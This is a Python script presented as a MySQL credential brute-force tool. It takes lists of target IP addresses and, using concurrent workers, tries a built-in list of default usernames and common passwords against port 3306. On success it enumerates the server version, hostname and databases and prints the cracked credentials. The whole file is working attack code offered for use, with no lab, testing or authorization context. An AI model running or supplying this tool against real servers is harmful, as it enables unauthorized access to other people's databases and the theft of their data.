#!/usr/bin/env python3
"""
MySQL Credential Brute-Force Tool
对找到的 MySQL 3306 主机批量尝试常见默认密码

用法:
  pip install mysql-connector-python
  python brute_mysql.py <ip1> [ip2] ...
  python brute_mysql.py --file ips.txt
  python brute_mysql.py --file ips.txt --max 50
"""

import sys
import argparse
import mysql.connector
from concurrent.futures import ThreadPoolExecutor, as_completed

COMMON_PASSWORDS = [
    "root", "password", "mysql", "123456", "12345678", "root123",
    "admin", "test", "", "rootroot", "toor", "pass", "abc123",
    "letmein", "welcome", "monkey", "dragon", "master", "qwerty",
    "login", "princess", "solo", "passw0rd", "hello", "charlie",
    "1234", "12345", "1234567", "123456789", "1234567890",
    "password1", "Password1", "root1234", "admin123",
    "mysql123", "test123", "oracle", "postgres", "sa",
    "p@ssw0rd", "P@ssw0rd", "root!", "admin!",
    "changeme", "default", "guest", "user", "mysqlroot",
    "root1", "root12", "root12345", "adminroot",
    "dba", "operator", "backup", "restore", "super",
]

USERS = ["root", "admin", "mysql", "test"]


def try_connect(ip, port, user, pwd, timeout=5):
    try:
        c = mysql.connector.connect(
            host=ip, port=port,
            user=user, password=pwd,
            connect_timeout=timeout, database="mysql"
        )
        cursor = c.cursor()
        cursor.execute("SELECT VERSION(), CURRENT_USER(), @@hostname")
        row = cursor.fetchone()
        cursor.execute("SHOW DATABASES")
        dbs = [r[0] for r in cursor.fetchall()]
        cursor.execute("SHOW VARIABLES LIKE 'version_compile_os'")
        os_info = cursor.fetchone()
        cursor.execute("SHOW VARIABLES LIKE 'max_connections'")
        max_conn = cursor.fetchone()
        c.close()
        return {
            "ip": ip, "port": port, "user": user, "password": pwd,
            "status": "SUCCESS",
            "mysql_version": row[0] if row else "",
            "current_user": row[1] if row else "",
            "hostname": row[2] if row else "",
            "databases": dbs,
            "compile_os": os_info[1] if os_info else "",
            "max_connections": max_conn[1] if max_conn else "",
        }
    except mysql.connector.errors.ProgrammingError as e:
        err = str(e)
        if "Access denied" in err:
            return {"ip": ip, "port": port, "user": user, "password": pwd, "status": "DENIED"}
        return {"ip": ip, "port": port, "user": user, "password": pwd, "status": "ERROR", "error": err}
    except Exception as e:
        return {"ip": ip, "port": port, "user": user, "password": pwd, "status": "ERROR", "error": str(e)}


def brute_ip(ip, port=3306, max_attempts=50):
    tried = 0
    for user in USERS:
        for pwd in COMMON_PASSWORDS:
            if tried >= max_attempts:
                return [{"ip": ip, "port": port, "status": "MAX_ATTEMPTS_REACHED", "tried": tried}]
            tried += 1
            result = try_connect(ip, port, user, pwd)
            if result["status"] == "SUCCESS":
                return [result]
    return [{"ip": ip, "port": port, "status": "NO_MATCH", "tried": tried}]


def main():
    parser = argparse.ArgumentParser(description="MySQL Credential Brute-Force")
    parser.add_argument("ips", nargs="*", help="IP addresses to target")
    parser.add_argument("--file", "-f", help="File with one IP per line")
    parser.add_argument("--port", "-p", type=int, default=3306, help="MySQL port (default: 3306)")
    parser.add_argument("--max", "-m", type=int, default=50, help="Max password attempts per host (default: 50)")
    parser.add_argument("--workers", "-w", type=int, default=10, help="Concurrent workers (default: 10)")
    args = parser.parse_args()

    ips = set(args.ips)
    if args.file:
        with open(args.file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    ips.add(line)

    if not ips:
        print("Usage: python brute_mysql.py <ip1> [ip2] ...")
        print("       python brute_mysql.py --file ips.txt")
        sys.exit(1)

    print(f"[*] Targeting {len(ips)} IPs, port {args.port}, max {args.max} attempts each")
    print(f"[*] Users: {', '.join(USERS)}")
    print(f"[*] Workers: {args.workers}")
    print()

    results = []
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {pool.submit(brute_ip, ip, args.port, args.max): ip for ip in sorted(ips)}
        for i, f in enumerate(as_completed(futures), 1):
            ip = futures[f]
            try:
                res = f.result()
                results.extend(res)
                for r in res:
                    if r.get("status") == "SUCCESS":
                        print(f"  [!!!] {ip} -> {r.get('user')}/{r.get('password')}")
                        print(f"       MySQL: {r.get('mysql_version')}")
                        print(f"       User: {r.get('current_user')}")
                        print(f"       Host: {r.get('hostname')}")
                        print(f"       DBs: {r.get('databases')}")
                    elif r.get("status") == "DENIED":
                        print(f"  [-] {ip} -> access denied (trying next)")
                    elif r.get("status") == "ERROR":
                        print(f"  [!] {ip} -> error: {r.get('error', '?')[:60]}")
                    else:
                        print(f"  [-] {ip} -> no match after {r.get('tried', 0)} attempts")
            except Exception as e:
                print(f"  [!] {ip} -> exception: {e}")

    # Summary
    success = [r for r in results if r.get("status") == "SUCCESS"]
    denied = [r for r in results if r.get("status") == "DENIED"]
    errors = [r for r in results if r.get("status") == "ERROR"]
    nomatch = [r for r in results if r.get("status") == "NO_MATCH"]

    print(f"\n{'='*60}")
    print(f"  Summary: {len(results)} hosts scanned")
    print(f"  SUCCESS: {len(success)} | DENIED: {len(denied)} | ERROR: {len(errors)} | NO_MATCH: {len(nomatch)}")
    if success:
        print(f"\n  Found credentials:")
        for r in success:
            print(f"    {r['ip']}:{r['port']} -> {r['user']}/{r['password']}")


if __name__ == "__main__":
    main()